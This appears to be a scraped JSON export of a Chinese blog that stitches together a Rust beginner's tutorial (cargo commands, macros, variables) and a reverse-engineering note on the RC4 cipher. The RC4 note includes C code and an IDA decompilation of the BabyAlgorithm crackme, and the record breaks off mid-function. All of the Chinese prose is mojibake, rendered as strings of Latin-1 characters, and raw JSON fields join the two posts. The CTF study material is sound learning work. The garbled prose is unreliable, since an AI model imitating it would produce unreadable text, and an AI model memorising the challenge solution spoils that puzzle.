ä¸ªç‚¹éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œåœ¨Rustä¸­ println! è°ƒç”¨äº†ä¸€ä¸ª Rust å®ï¼ˆmacroï¼‰ã€‚å¦‚æœæ˜¯è°ƒç”¨å‡½æ•°ï¼Œåˆ™åº”è¾“å…¥ printlnï¼ˆæ²¡æœ‰!ï¼‰ å…³äºå®ï¼Œæˆ‘ä»¬åé¢å†è¯´ï¼Œç°åœ¨ä½ åªéœ€è®°ä½ï¼Œå½“çœ‹åˆ°ç¬¦å· ! çš„æ—¶å€™ï¼Œå°±æ„å‘³ç€è°ƒç”¨çš„æ˜¯å®è€Œä¸æ˜¯æ™®é€šå‡½æ•°ï¼Œå¹¶ä¸”å®å¹¶ä¸æ€»æ˜¯éµå¾ªä¸å‡½æ•°ç›¸åŒçš„è§„åˆ™ã€‚\nå¦å¤–ï¼Œè¿™ä¸ªè¯­å¥ä»¥;ç»“å°¾ï¼ŒRustä¸­çš„å¤§å¤šæ•°è¯­å¥éƒ½ä»¥ ; ç»“å°¾ï¼Œä½† ; å¹¶ä¸æ˜¯ç®€å•çš„è¡Œä¸è¡Œä¹‹é—´çš„åˆ†å‰²ç¬¦ï¼Œè€Œæ˜¯æ ‡è‡´ç€ä¸€ä¸ªè¯­å¥çš„ç»“æŸã€‚åœ¨è¯­å¥æœªç»“æŸæ—¶ä½¿ç”¨ ; æ˜¯é”™è¯¯çš„ã€‚\nä¾‹å¦‚ï¼š\n1 2 3 fn add_one(x: i32) -\u0026gt;i32 { x + 1 } è¿™é‡Œä¼šè¿”å›ä¸€ä¸ª i32 çš„å€¼ï¼Œä½†å¦‚æœåŠ äº† ; å®ƒä¼šè¿”å›()\nè¿™é‡Œç®€å•çš„æä¸€å˜´ï¼Œå¹¶ä¸æ˜¯æˆ‘ä»¬ç°åœ¨è¦è®¨è®ºçš„æ ¸å¿ƒï¼Œä½†è¿™ä¸ªå°çŸ¥è¯†ç‚¹è¿˜æ˜¯è¦è®°ä½çš„ã€‚\nç°åœ¨æˆ‘ä»¬è®©å®ƒè·‘èµ·æ¥ï¼š\nåœ¨ç»ˆç«¯ä¸­ï¼Œæˆ‘ä»¬è¾“å…¥ï¼š\ncargo run\nå°±ä¼šå¾—åˆ°Hello World!\nç¼–è¯‘ä¸è¿è¡Œ\ré€šè¿‡ä¸Šé¢é‚£ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°Rustçš„ç¼–è¯‘å’Œè¿è¡Œæ˜¯åˆ†å¼€çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è®©å®ƒå¿«é€Ÿæ‰§è¡Œç¼–è¯‘ï¼Œä¹Ÿå¯ä»¥å…ˆç¼–è¯‘ç„¶åå†è¿è¡Œï¼Œä¸è¿‡æ€»ä¹‹éƒ½æ˜¯è¦ç¼–è¯‘çš„ï¼Œè¿™ä¹Ÿæ˜¯ç³»ç»Ÿè¯­è¨€å’Œè„šæœ¬è¯­è¨€çš„ä¸€å¤§ä¸åŒç‚¹ã€‚\næˆ‘ä»¬ä½¿ç”¨ï¼š\ncargo build\næ¥ç¼–è¯‘æˆ‘ä»¬æˆ‘ä»¬çš„ç¨‹åº\nç„¶åä½¿ç”¨ï¼š\ncargo run\næ¥è®©é¡¹ç›®è·‘èµ·æ¥ã€‚\nCargo è¿˜æä¾›äº†ä¸€ä¸ªåä¸º cargo check çš„å‘½ä»¤ã€‚è¯¥å‘½ä»¤å¿«é€Ÿæ£€æŸ¥ä»£ç ç¡®ä¿å…¶å¯ä»¥ç¼–è¯‘ï¼Œä½†å¹¶ä¸äº§ç”Ÿå¯æ‰§è¡Œæ–‡ä»¶ï¼š\ncargo check\ncargo check æ˜¯æˆ‘ä»¬åœ¨ä»£ç å¼€å‘è¿‡ç¨‹ä¸­æœ€å¸¸ç”¨çš„å‘½ä»¤ï¼Œå®ƒçš„ä½œç”¨å¾ˆç®€å•ï¼šå¿«é€Ÿçš„æ£€æŸ¥ä¸€ä¸‹ä»£ç èƒ½å¦ç¼–è¯‘é€šè¿‡ã€‚å› æ­¤è¯¥å‘½ä»¤é€Ÿåº¦ä¼šéå¸¸å¿«ï¼Œèƒ½èŠ‚çœå¤§é‡çš„ç¼–è¯‘æ—¶é—´ã€‚\nBTW, ä»¥ä¸Šçš„ç¼–è¯‘å’Œè¿è¡Œéƒ½æ˜¯åœ¨debugæ¨¡å¼ä¸‹è¿›è¡Œçš„ï¼Œåœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œä»£ç çš„ç¼–è¯‘é€Ÿåº¦ä¼šéå¸¸å¿«ï¼Œå¯æ˜¯ç¦å…®ç¥¸æ‰€ä¼ï¼Œè¿è¡Œé€Ÿåº¦å°±æ…¢äº†. åŸå› æ˜¯ï¼Œåœ¨ debug æ¨¡å¼ä¸‹ï¼ŒRust ç¼–è¯‘å™¨ä¸ä¼šåšä»»ä½•çš„ä¼˜åŒ–ï¼Œåªä¸ºäº†å°½å¿«çš„ç¼–è¯‘å®Œæˆï¼Œè®©ä½ çš„å¼€å‘æµç¨‹æ›´åŠ é¡ºç•…ã€‚\nå¦‚æœæƒ³è¦é«˜æ€§èƒ½çš„ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å‘½ä»¤åé¢åŠ ä¸Š --release :\ncargo run â€“release cargo build â€“release\n[!NOTE]\nrustè‡ªèº«æ˜¯ä½¿ç”¨rustcè¿›è¡Œç¼–è¯‘çš„ï¼Œ rustc,rustupå’Œcargoä¹‹é—´çš„å…³ç³»å¯ä»¥ç†è§£ä¸ºrustcæ˜¯ç¼–è¯‘å™¨ï¼Œrustupæ˜¯æ›´æ–°å™¨ï¼Œcargoæ˜¯åŒ…ç®¡ç†å™¨\nRust åŸºç¡€è¯­æ³•\rå˜é‡ï¼ŒåŸºæœ¬ç±»å‹ï¼Œå‡½æ•°ï¼Œæ³¨é‡Šå’Œæ§åˆ¶æµï¼Œè¿™äº›å‡ ä¹æ˜¯æ¯ç§ç¼–ç¨‹è¯­è¨€éƒ½å…·æœ‰çš„ç¼–ç¨‹æ¦‚å¿µã€‚\nè¿™äº›åŸºç¡€æ¦‚å¿µå°†å­˜åœ¨äºæ¯ä¸ª Rust ç¨‹åºä¸­ï¼ŒåŠæ—©å­¦ä¹ å®ƒä»¬å°†ä½¿ä½ ä»¥æœ€å¿«çš„é€Ÿåº¦å­¦ä¹  Rust çš„ä½¿ç”¨ã€‚\nå˜é‡\ré¦–å…ˆå¿…é¡»è¯´æ˜ï¼ŒRust æ˜¯å¼ºç±»å‹è¯­è¨€ï¼Œä½†å…·æœ‰è‡ªåŠ¨åˆ¤æ–­å˜é‡ç±»å‹çš„èƒ½åŠ›ã€‚è¿™å¾ˆå®¹æ˜“è®©äººä¸å¼±ç±»å‹è¯­è¨€äº§ç”Ÿæ··æ·†ã€‚\né»˜è®¤æƒ…å†µä¸‹ï¼ŒRust ä¸­çš„å˜é‡æ˜¯ä¸å¯å˜çš„ï¼Œé™¤éä½¿ç”¨ mut å…³é”®å­—å£°æ˜ä¸ºå¯å˜å˜é‡ã€‚\n1 2 let a = 123; // ä¸å¯å˜å˜é‡ let mut b = 10; // å¯å˜å˜é‡ å¦‚æœè¦å£°æ˜å˜é‡ï¼Œéœ€è¦ä½¿ç”¨ let å…³é”®å­—ã€‚ä¾‹å¦‚ï¼š\n1 let a = 123; ","date":"2025-06-01T10:31:09+08:00","image":"https://rust-lang.org/static/images/rust-logo-blk.svg","permalink":"https://Oight.github.io/p/rust%E5%AD%A6%E4%B9%A0/","title":"Rustå­¦ä¹ "},{"content":"ç²¾åŠ›ä¸€ç›´æ”¾åœ¨Webå’Œä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ä¸Šï¼ˆæ¯”å¦‚ rust webåº”ç”¨()ï¼‰ï¼Œçªç„¶å‘ç°å¥½ä¹…æ²¡åšé€†å‘é¢˜äº†ï¼ŒçŸ¥è¯†ç‚¹éƒ½å¿˜è®°äº†å¾ˆå¤šï¼Œç”šè‡³IDAéƒ½ä¸ä¼šç”¨äº†ï¼ˆå…¶å®æœ¬æ¥å°±ä¸æ€ä¹ˆä¼šç”¨()ï¼‰\næ‰€ä»¥é‡æ–°å­¦ä¸€ä¸‹é€†å‘çš„ä¸€äº›çŸ¥è¯†ï¼Œé¡ºä¾¿è¿›è¡Œä¸€äº›æ¢³ç†å’Œæ•´åˆã€‚\nRC4ç®—æ³•\nRC4åŠ å¯†ç®—æ³•æ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³•ã€‚\nä»€ä¹ˆæ˜¯å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Ÿ\nå¯¹ç§°åŠ å¯†(ä¹Ÿå«ç§é’¥åŠ å¯†)æŒ‡åŠ å¯†å’Œè§£å¯†ä½¿ç”¨ç›¸åŒå¯†é’¥çš„åŠ å¯†ç®—æ³•ã€‚æœ‰æ—¶åˆå«ä¼ ç»Ÿå¯†ç ç®—æ³•ï¼Œå°±æ˜¯åŠ å¯†å¯†é’¥èƒ½å¤Ÿä»è§£å¯†å¯†é’¥ä¸­æ¨ç®—å‡ºæ¥ï¼ŒåŒæ—¶è§£å¯†å¯†é’¥ä¹Ÿå¯ä»¥ä»åŠ å¯†å¯†é’¥ä¸­æ¨ç®—å‡ºæ¥ã€‚è€Œåœ¨å¤§å¤šæ•°çš„å¯¹ç§°ç®—æ³•ä¸­ï¼ŒåŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥ä¹Ÿç§°è¿™ç§åŠ å¯†ç®—æ³•ä¸ºç§˜å¯†å¯†é’¥ç®—æ³•æˆ–å•å¯†é’¥ç®—æ³•ã€‚å®ƒè¦æ±‚å‘é€æ–¹å’Œæ¥æ”¶æ–¹åœ¨å®‰å…¨é€šä¿¡ä¹‹å‰ï¼Œå•†å®šä¸€ä¸ªå¯†é’¥ã€‚å¯¹ç§°ç®—æ³•çš„å®‰å…¨æ€§ä¾èµ–äºå¯†é’¥ï¼Œæ³„æ¼å¯†é’¥å°±æ„å‘³ç€ä»»ä½•äººéƒ½å¯ä»¥å¯¹ä»–ä»¬å‘é€æˆ–æ¥æ”¶çš„æ¶ˆæ¯è§£å¯†ï¼Œæ‰€ä»¥å¯†é’¥çš„ä¿å¯†æ€§å¯¹é€šä¿¡çš„å®‰å…¨æ€§è‡³å…³é‡è¦ã€‚\nRC4ç®—æ³•å®ç°è¿‡ç¨‹\rRC4ç®—æ³•åŒ…æ‹¬åˆå§‹åŒ–ç®—æ³•(KSA)å’Œéšå³å­å¯†ç ç”Ÿæˆç®—æ³•(PRGA)ä¸¤éƒ¨åˆ†ã€‚\nKSA\ræˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ç®—æ³•ä¸­çš„åˆå§‹åŒ–éƒ¨åˆ†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 c /*åˆå§‹åŒ–å‡½æ•°*/ void rc4_init(unsigned char*s,unsigned char*key, unsigned long Len) { int i=0,j=0; char k[256]={0}; unsigned char tmp=0; for(i=0;i\u0026lt;256;i++) { s[i]=i; k[i]=key[i%Len]; } for(i=0;i\u0026lt;256;i++) { j=(j+s[i]+k[i])%256; tmp=s[i]; s[i]=s[j];//äº¤æ¢s[i]å’Œs[j] s[j]=tmp; } } å‚æ•°1æ˜¯ä¸€ä¸ª256é•¿åº¦çš„charå‹æ•°ç»„ï¼Œå®šä¹‰ä¸º: unsigned char sBox[256];\nå‚æ•°2æ˜¯å¯†é’¥ï¼Œå…¶å†…å®¹å¯ä»¥éšä¾¿å®šä¹‰ï¼šchar key[256];\nå‚æ•°3æ˜¯å¯†é’¥çš„é•¿åº¦ï¼ŒLen = strlen(key);\nåˆå§‹åŒ–çš„è¿‡ç¨‹æ˜¯å…ˆæœ‰ä¸€ä¸ªsbox(sç›’)ï¼Œsç›’çš„é•¿åº¦æ˜¯256ï¼Œç„¶åæœ‰ä¸€ä¸ªéšæ„é•¿åº¦çš„å¯†é’¥ï¼Œä¸€ä¸ªä¸­é—´çš„ä¸´æ—¶å˜é‡(tmp)ï¼Œåœ¨åˆå§‹åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œå…ˆå®šä¹‰ä¸€ä¸ª i ï¼Œå°† i ä»0å¼€å§‹åˆ°255ä»¥æ­¤éå†å¡«å……è¿›sç›’ä¸­ï¼›ç„¶åå®šä¹‰ä¸€ä¸ª j ï¼Œä½¿ç”¨j=(j+s[i]+k[i])%256ï¼Œå¾—åˆ° j æ˜¯å‡ ï¼›ç„¶å i å’Œ j ä½œä¸ºsç›’çš„ç´¢å¼•ï¼Œè¿›è¡ŒéšæœºåŒ–å¤„ç†ã€‚å› æ­¤ï¼Œ\n1 2 3 4 j=(j+s[i]+k[i])%256; tmp=s[i]; s[i]=s[j];//äº¤æ¢s[i]å’Œs[j] s[j]=tmp; è¿™ä¸€éƒ¨åˆ†æ˜¯æ ¹æ®å¯†é’¥æ¥æ‰“ä¹±sç›’ï¼Œi ç¡®ä¿S-boxçš„æ¯ä¸ªå…ƒç´ éƒ½å¾—åˆ°å¤„ç†ï¼Œj ä¿è¯S-boxçš„æ…ä¹±æ˜¯éšæœºçš„ã€‚\nPRGA\ræ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹çœ‹éšå³å­å¯†ç ç”Ÿæˆç®—æ³•ï¼Œå³åŠ è§£å¯†çš„è¿‡ç¨‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 c /*åŠ è§£å¯†*/ void rc4_crypt(unsigned char*s,unsigned char*Data,unsigned long Len) { int i=0,j=0,t=0; unsigned long k=0; unsigned char tmp; for(k=0;k\u0026lt;Len;k++) { i=(i+1)%256; j=(j+s[i])%256; tmp=s[i]; s[i]=s[j];//äº¤æ¢s[x]å’Œs[y] s[j]=tmp; t=(s[i]+s[j])%256; Data[k]^=s[t]; } } å‚æ•°1æ˜¯ä¸Šè¾¹rc4_initå‡½æ•°ä¸­ï¼Œè¢«æ…ä¹±çš„S-box;\nå‚æ•°2æ˜¯éœ€è¦åŠ å¯†çš„æ•°æ®data;\nå‚æ•°3æ˜¯dataçš„é•¿åº¦.\næˆ‘ä»¬çœ‹åˆ°æˆ‘ä»¬ç°åœ¨å¡«å…¥äº†è¦åŠ å¯†çš„å†…å®¹ï¼Œæ¥åˆ†æä¸€ä¸‹åŠ å¯†çš„è¿‡ç¨‹ã€‚\né¦–å…ˆæ˜¯åœ¨KSAä¸­è¢«æ‰“ä¹±çš„sç›’ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±ä¸å†éœ€è¦å¯†é’¥äº†ï¼Œæˆ‘ä»¬ç»§ç»­å¯¹sç›’ä¸­çš„å…ƒç´ è¿›è¡Œå¤„ç†ã€‚\né€šè¿‡å¯¹sç›’ä¸­çš„å…ƒç´ çš„ç´¢å¼• i å’Œ j è¿›è¡Œå¤„ç†ï¼š\n1 2 3 4 5 i=(i+1)%256; j=(j+s[i])%256; tmp=s[i]; s[i]=s[j];//äº¤æ¢s[x]å’Œs[y] s[j]=tmp; è¿™ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬ä½¿ i åŠ ä¸€ï¼Œå¾—åˆ°æ–°çš„ i ç„¶å j ç­‰äº j åŠ ä¸Šæ–°çš„ i ç´¢å¼•çš„æ•°å­—ï¼Œç„¶å i å’Œ j å®šä½äº†æ–°çš„ä½ç½®ï¼Œç„¶åé€šè¿‡t=(s[i]+s[j])%256;ï¼Œæ¥å¾—åˆ°å¯†é’¥æµï¼Œæœ€åä½¿ç”¨å¯†é’¥æµå’Œè¦åŠ å¯†çš„æ•°æ®è¿›è¡Œå¼‚æˆ–å¾—åˆ°å¯†æ–‡ã€‚\nå³æ¯æ”¶åˆ°ä¸€ä¸ªå­—èŠ‚ï¼Œå°±è¿›è¡Œwhileå¾ªç¯ã€‚é€šè¿‡ä¸€å®šçš„ç®—æ³•å®šä½Sç›’ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶ä¸è¾“å…¥å­—èŠ‚å¼‚æˆ–ï¼Œå¾—åˆ°kã€‚å¾ªç¯ä¸­è¿˜æ”¹å˜äº†Sç›’ã€‚å¦‚æœè¾“å…¥çš„æ˜¯æ˜æ–‡ï¼Œè¾“å‡ºçš„å°±æ˜¯å¯†æ–‡ï¼›å¦‚æœè¾“å…¥çš„æ˜¯å¯†æ–‡ï¼Œè¾“å‡ºçš„å°±æ˜¯æ˜æ–‡ã€‚\næˆ‘ä»¬æ¥çœ‹çœ‹å®Œæ•´çš„ç¨‹åº\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 c //ç¨‹åºå¼€å§‹ #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; typedef unsigned longULONG; /*åˆå§‹åŒ–å‡½æ•°*/ void rc4_init(unsigned char*s, unsigned char*key, unsigned long Len) { int i = 0, j = 0; char k[256] = { 0 }; unsigned char tmp = 0; for (i = 0; i\u0026lt;256; i++) { s[i] = i; k[i] = key[i%Len]; } for (i = 0; i\u0026lt;256; i++) { j = (j + s[i] + k[i]) % 256; tmp = s[i]; s[i] = s[j];//äº¤æ¢s[i]å’Œs[j] s[j] = tmp; } } /*åŠ è§£å¯†*/ void rc4_crypt(unsigned char*s, unsigned char*Data, unsigned long Len) { int i = 0, j = 0, t = 0; unsigned long k = 0; unsigned char tmp; for (k = 0; k\u0026lt;Len; k++) { i = (i + 1) % 256; j = (j + s[i]) % 256; tmp = s[i]; s[i] = s[j];//äº¤æ¢s[x]å’Œs[y] s[j] = tmp; t = (s[i] + s[j]) % 256; Data[k] ^= s[t]; } } int main() { unsigned char s[256] = { 0 }, s2[256] = { 0 };//S-box char key[256] = { \u0026#34;justfortest\u0026#34; }; char pData[512] = \u0026#34;è¿™æ˜¯ä¸€ä¸ªç”¨æ¥åŠ å¯†çš„æ•°æ®Data\u0026#34;; unsigned long len = strlen(pData); int i; printf(\u0026#34;pData=%s\\n\u0026#34;, pData); printf(\u0026#34;key=%s,length=%d\\n\\n\u0026#34;, key, strlen(key)); rc4_init(s, (unsigned char*)key, strlen(key));//å·²ç»å®Œæˆäº†åˆå§‹åŒ– printf(\u0026#34;å®Œæˆå¯¹S[i]çš„åˆå§‹åŒ–ï¼Œå¦‚ä¸‹ï¼š\\n\\n\u0026#34;); for (i = 0; i\u0026lt;256; i++) { printf(\u0026#34;%02X\u0026#34;, s[i]); if (i \u0026amp;\u0026amp; (i + 1) % 16 == 0)putchar(\u0026#39;\\n\u0026#39;); } printf(\u0026#34;\\n\\n\u0026#34;); for (i = 0; i\u0026lt;256; i++)//ç”¨s2[i]æš‚æ—¶ä¿ç•™ç»è¿‡åˆå§‹åŒ–çš„s[i]ï¼Œå¾ˆé‡è¦çš„ï¼ï¼ï¼ { s2[i] = s[i]; } printf(\u0026#34;å·²ç»åˆå§‹åŒ–ï¼Œç°åœ¨åŠ å¯†:\\n\\n\u0026#34;); rc4_crypt(s, (unsigned char*)pData, len);//åŠ å¯† printf(\u0026#34;pData=%s\\n\\n\u0026#34;, pData); printf(\u0026#34;å·²ç»åŠ å¯†ï¼Œç°åœ¨è§£å¯†:\\n\\n\u0026#34;); //rc4_init(s,(unsignedchar*)key,strlen(key));//åˆå§‹åŒ–å¯†é’¥ rc4_crypt(s2, (unsigned char*)pData, len);//è§£å¯† printf(\u0026#34;pData=%s\\n\\n\u0026#34;, pData); return 0; } //ç¨‹åºå®Œ è¿™æ—¶å€™æœ‰äººå°±è¦é—®äº†ï¼Œä½ å†™è¿™ä¹ˆç»•ï¼Œè¿™ä¹ˆæ¨¡ç³Šè°èƒ½çœ‹å¾—æ‡‚å•Šï¼Ÿ\næ‰€ä»¥æˆ‘ä»¬æ¥ä¸¾å‡ ä¸ªä¾‹å­å¸®åŠ©ç†è§£ï¼š\nåŠ å¯†æµç¨‹è¯¦è§£\rä¸€ã€æ•°å­¦å®ç°\nåˆå§‹åŒ–Sç›’ï¼ˆKey Scheduling Algorithm, KSAï¼‰ åˆå§‹çŠ¶æ€ï¼šSç›’æ˜¯ä¸€ä¸ªé•¿åº¦ä¸º256çš„æ•°ç»„ï¼ˆS[0], S[1], â€¦, S[255]ï¼‰ï¼Œåˆå§‹æ—¶æŒ‰é¡ºåºå¡«å……0åˆ°255ï¼š\n1 2 plaintext S[0] = 0, S[1] = 1, ..., S[255] = 255 å¯†é’¥é¢„å¤„ç†ï¼šå¦‚æœå¯†é’¥é•¿åº¦ä¸è¶³256å­—èŠ‚ï¼Œå¾ªç¯é‡å¤å¯†é’¥ç›´åˆ°å¡«æ»¡256å­—èŠ‚ã€‚ä¾‹å¦‚å¯†é’¥æ˜¯KEYï¼ˆ3å­—èŠ‚ï¼‰ï¼Œåˆ™æ‰©å±•ä¸ºK E Y K E Y K E Y ...ã€‚\næ´—ç‰Œç®—æ³•ï¼š\n1 2 3 4 5 python j = 0 for i in 0åˆ°255: j = (j + S[i] + å¯†é’¥[i % å¯†é’¥é•¿åº¦]) % 256 # ç”¨å¯†é’¥å†³å®šäº¤æ¢ä½ç½® äº¤æ¢ S[i] å’Œ S[j] å…³é”®ç‚¹ï¼šå¯†é’¥çš„æ¯ä¸ªå­—èŠ‚éƒ½ä¼šå½±å“æ´—ç‰Œè¿‡ç¨‹ï¼Œä½†å‰å‡ ä¸ªå­—èŠ‚çš„å½±å“å¯èƒ½è¢«åç»­æ­¥éª¤è¦†ç›–ã€‚\nç”Ÿæˆå¯†é’¥æµï¼ˆPseudo-Random Generation Algorithm, PRGAï¼‰ åˆå§‹åŒ–æŒ‡é’ˆï¼ši = 0, j = 0\nå¾ªç¯ç”Ÿæˆæ¯ä¸ªå¯†é’¥å­—èŠ‚ï¼š\n1 2 3 4 5 6 python i = (i + 1) % 256 # iæ¯æ¬¡å‘å‰ç§»åŠ¨1æ­¥ j = (j + S[i]) % 256 # jæ ¹æ®S[i]çš„å€¼è·³è·ƒ äº¤æ¢ S[i] å’Œ S[j] # åŠ¨æ€æ‰“ä¹±Sç›’ t = (S[i] + S[j]) % 256 # è®¡ç®—ç´¢å¼•t å¯†é’¥å­—èŠ‚ = S[t] # è¾“å‡ºå¯†é’¥æµçš„ä¸€ä¸ªå­—èŠ‚ å…³é”®ç‚¹ï¼šæ¯ç”Ÿæˆä¸€ä¸ªå¯†é’¥å­—èŠ‚ï¼ŒSç›’çš„çŠ¶æ€éƒ½ä¼šæ”¹å˜ï¼Œå¯†é’¥æµä¾èµ–äºåŠ¨æ€å˜åŒ–çš„Sç›’ã€‚\näºŒã€ä¸¾ä¸ªå…·ä½“ä¾‹å­\nç¤ºä¾‹1ï¼šåˆå§‹åŒ–Sç›’\nå‡è®¾å¯†é’¥æ˜¯[0x01, 0x02, 0x03]ï¼ˆ3å­—èŠ‚ï¼‰ï¼š\nåˆå§‹åŒ–Sç›’\nï¼š\n1 2 plaintext S = [0,1,2,3, ..., 255] æ´—ç‰Œè¿‡ç¨‹\nï¼ˆå‰3æ­¥æ¼”ç¤ºï¼‰ï¼š\ni=0\nï¼š\nj = (0 + S[0] + Key[0]) % 256 = (0 + 0 + 1) % 256 = 1 äº¤æ¢ S[0] å’Œ S[1] â†’ Så˜ä¸º [1,0,2,3, ..., 255] i=1\nï¼š\nj = (1 + S[1] + Key[1]) % 256 = (1 + 0 + 2) % 256 = 3 äº¤æ¢ S[1] å’Œ S[3] â†’ Så˜ä¸º [1,3,2,0, ..., 255] i=2\nï¼š\nj = (3 + S[2] + Key[2]) % 256 = (3 + 2 + 3) % 256 = 8 äº¤æ¢ S[2] å’Œ S[8] â†’ S[8]çš„å€¼è¢«æ¢åˆ°ä½ç½®2ã€‚ â€¦ï¼ˆæŒç»­åˆ°i=255ï¼‰\nç¤ºä¾‹2ï¼šç”Ÿæˆå¯†é’¥æµ\nå‡è®¾åˆå§‹åŒ–åçš„Sç›’ä¸º [3, 1, 4, 0, 2, 5, ...]ï¼ˆç®€åŒ–ä¸¾ä¾‹ï¼‰ï¼š\nç¬¬1ä¸ªå¯†é’¥å­—èŠ‚\nï¼š\ni = (0 + 1) = 1 j = (0 + S[1]) = 0 + 1 = 1 äº¤æ¢ S[1] å’Œ S[1]ï¼ˆæ— å˜åŒ–ï¼‰ t = (S[1] + S[1]) = 1 + 1 = 2 å¯†é’¥å­—èŠ‚ = S[2] = 4 â†’ å¯†é’¥æµç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯4 ç¬¬2ä¸ªå¯†é’¥å­—èŠ‚\nï¼š\ni = 2 j = (1 + S[2]) = 1 + 4 = 5 äº¤æ¢ S[2] å’Œ S[5] â†’ S[2]=5, S[5]=4 t = (5 + 4) = 9 â†’ å¯†é’¥å­—èŠ‚ = S[9] â€¦ ä¾‹é¢˜\ræ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹RC4ç®—æ³•åœ¨CTFä¸­çš„å…·ä½“å®ç°\n[BabyAlgorithm](https://buuoj.cn/challenges#[ç¬¬äº”ç«  CTFä¹‹REç« ]BabyAlgorithm)\nå¯¼å…¥IDAï¼ŒæŸ¥çœ‹mainå‡½æ•°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 c __int64 __fastcall main(int a1, char **a2, char **a3) { __int64 result; // rax int i; // [rsp+Ch] [rbp-E4h] char v5[16]; // [rsp+10h] [rbp-E0h] BYREF char s[64]; // [rsp+20h] [rbp-D0h] BYREF char v7[64]; // [rsp+60h] [rbp-90h] BYREF char v8[72]; // [rsp+A0h] [rbp-50h] BYREF unsigned __int64 v9; // [rsp+E8h] [rbp-8h] v9 = __readfsqword(0x28u); memset(v8, 0, 0x40uLL); v8[0] = 0xC6; v8[1] = 0x21; v8[2] = 0xCA; v8[3] = 0xBF; v8[4] = 0x51; v8[5] = 0x43; v8[6] = 0x37; v8[7] = 0x31; v8[8] = 0x75; v8[9] = 0xE4; v8[0xA] = 0x8E; v8[0xB] = 0xC0; v8[0xC] = 0x54; v8[0xD] = 0x6F; v8[0xE] = 0x8F; v8[0xF] = 0xEE; v8[0x10] = 0xF8; v8[0x11] = 0x5A; v8[0x12] = 0xA2; v8[0x13] = 0xC1; v8[0x14] = 0xEB; v8[0x15] = 0xA5; v8[0x16] = 0x34; v8[0x17] = 0x6D; v8[0x18] = 0x71; v8[0x19] = 0x55; v8[0x1A] = 8; v8[0x1B] = 7; v8[0x1C] = 0xB2; v8[0x1D] = 0xA8; v8[0x1E] = 0x2F; v8[0x1F] = 0xF4; v8[0x20] = 0x51; v8[0x21] = 0x8E; v8[0x22] = 0xC; v8[0x23] = 0xCC; qmemcpy(\u0026amp;v8[0x24], \u0026#34;3S1\u0026#34;, 3); v8[0x28] = 0x40; v8[0x29] = 0xD6; v8[0x2A] = 0xCA; v8[0x2B] = 0xEC; v8[0x2C] = 0xD4; puts(\u0026#34;Input flag: \u0026#34;); __isoc99_scanf(\u0026#34;%63s\u0026#34;, s); if ( strlen(s) == 0x2D ) { strcpy(v5, \u0026#34;Nu1Lctf233\u0026#34;); sub_400874(v5, s, v7); for ( i = 0; i \u0026lt;= 0x2C; ++i ) { if ( v7[i] != v8[i] ) { puts(\u0026#34;GG!\u0026#34;); return 0LL; } } puts(\u0026#34;Congratulations!\u0026#34;); result = 0LL; } else { puts(\u0026#34;GG!\u0026#34;); result = 0LL; } return result; } æ³¨æ„ä¸‹é¢ä¸¤ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ªå…±åŒçš„ç‰¹å¾%256ï¼Œè¿™æ˜¯RC4ç®—æ³•çš„å…¸å‹ç‰¹å¾\nsub_400874 ä¸­ï¼Œsub_40067A()å’Œsub_400753()ä¸¤ä¸ªå‡½æ•°éƒ½æ˜¯åŠ å¯†ç®—æ³•ï¼Œ\nsub_40067A()æ˜¯æµå¯†é’¥çš„ç”Ÿæˆï¼Œ\nsub_400753()æ˜¯åŠ å¯†ã€‚\nsub_400874:\n1 2 3 4 5 6 7 8 9 10 __int64 __fastcall sub_400874(__int64 a1, __int64 a2, __int64 a3) { char v5[264]; // [rsp+20h] [rbp-110h] BYREF unsigned __int64 v6; // [rsp+128h] [rbp-8h] v6 = __readfsqword(0x28u); sub_40067A(a1, v5); sub_400753(v5, a2, a3); return 0LL; } sub_40067A(æµå¯†é’¥ç”Ÿæˆ)ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 __int64 __fastcall sub_40067A(const char *a1, __int64 a2) { int v3; // [rsp+10h] [rbp-10h] int i; // [rsp+14h] [rbp-Ch] int j; // [rsp+18h] [rbp-8h] int v6; // [rsp+1Ch] [rbp-4h] v6 = strlen(a1); v3 = 0; for ( i = 0; i \u0026lt;= 255; ++i ) *(_BYTE *)(i + a2) = i; for ( j = 0; j \u0026lt;= 255; ++j ) { v3 = (*(unsigned __int8 *)(j + a2) + v3 + a1[j % v6]) % 256; sub_400646(j + a2, a2 + v3); } return 0LL; } sub_400753(åŠ å¯†)ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 __int64 __fastcall sub_400753(__int64 a1, const char *a2, 